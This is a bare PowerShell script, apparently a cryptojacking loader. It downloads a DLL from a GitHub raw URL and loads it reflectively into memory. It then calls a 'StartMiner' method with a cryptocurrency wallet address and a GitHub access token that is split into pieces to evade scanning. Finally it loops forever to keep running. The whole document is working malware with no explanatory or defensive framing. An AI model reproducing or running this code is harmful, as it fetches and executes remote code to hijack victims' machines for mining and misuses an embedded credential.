$c = @{
    u1 = "HolyV200"
    u2 = "test-repo"
    pat = "ghp_x0tf1" + "YFQcnAYM79aWZpnZ" + "KahM8QkHV2lHFLw"
    addr = "4483G1AgS1pdsLqzt3nFQmL8HPF3C2WVrLMRAdAVGqxz6ipV3aF8no7cmDkH4wMZz9YD5qNUZ96nGLMKpdt5rXZqMwGfLc3"
}
$url = "https://raw.githubusercontent.com/$($c.u1)/$($c.u2)/main/Bridge.dll"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
$bytes = $wc.DownloadData($url)
$asm = [System.AppDomain]::CurrentDomain.Load($bytes)
$repo = "$($c.u1)/$($c.u2)"
$asm.GetType('DateFundLoader').GetMethod('StartMiner').Invoke($null, @($false, $c.addr, $repo, $c.pat))
while($true) { Start-Sleep 3600 }
